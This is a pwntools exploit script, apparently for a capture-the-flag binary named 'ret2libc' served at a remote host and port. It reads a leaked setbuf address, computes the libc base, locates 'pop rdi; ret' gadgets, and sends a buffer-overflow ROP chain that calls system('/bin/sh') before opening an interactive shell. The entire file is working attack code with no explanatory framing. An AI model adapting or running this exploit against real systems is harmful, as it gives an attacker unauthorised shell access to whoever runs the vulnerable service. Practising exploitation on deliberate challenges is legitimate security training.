from pwn import *

context.arch = 'amd64'
if args.REMOTE:
    p = remote('lmao.lol', 7002)
elif args.HOST:
    p = process('./ret2libc')
else:
    context.terminal = ['tmux', 'splitw', '-h', '-p', '70']
    p = gdb.debug('./ret2libc',
                  gdbscript='''
                      b *joke
                      c
                      ''')
# libc = ELF('./libc6_2.39-0ubuntu8.2_amd64.so')
libc = ELF('./libc-2.18-9.2.mga4.x86_64.so')
rop = ROP(libc)
# Known addresses and offsets
output = p.recvuntil(b'- ')
address_part = p.recvuntil(b' -').strip().decode()
address_part = address_part.replace(' -', '')
setbuf_addr = int(address_part, 16)

# Offsets for libc functions and strings
setbuf_offset = libc.symbols['setbuf']  # Offset for setbuf in libc (assuming setbuf is printed)
system_offset = libc.symbols['system']  # Offset for system in libc
bin_sh_offset = next(libc.search(b'/bin/sh'))  # Offset of /bin/sh string in libc



# Find the address of 'pop rdi; ret'
pop_rdi_ret_offset = rop.find_gadget(['pop rdi', 'ret'])[0]
ret_gadget_offset = rop.find_gadget(['ret'])[0]   #: nop; ret;
# Calculate libc base and derived addresses
libc_base = setbuf_addr - setbuf_offset
system_addr = libc_base + system_offset
bin_sh_addr = libc_base + bin_sh_offset
pop_rdi_ret = libc_base + pop_rdi_ret_offset
ret_gadget = libc_base + ret_gadget_offset


print('setbuf:', hex(setbuf_addr))
print('libc_base:', hex(libc_base))
print('system:', hex(system_addr))
print('bin_sh_addr:', hex(bin_sh_addr))
print('pop_rdi_ret:', hex(pop_rdi_ret))

# Construct the payload
payload = cyclic(0x4d0, alphabet=string.ascii_uppercase, n=8).encode()
payload += cyclic(0x8, alphabet=string.ascii_uppercase, n=8).encode()

payload += p64(pop_rdi_ret)              # Place /bin/sh address into rdi
payload += p64(bin_sh_addr)              # /bin/sh string address
payload += p64(ret_gadget) # ret gadget to adjust stack alignment
payload += p64(system_addr)              # Call system

# Send the payload
# p.sendlineafter(b'?', payload)
p.sendline(payload)
p.interactive()
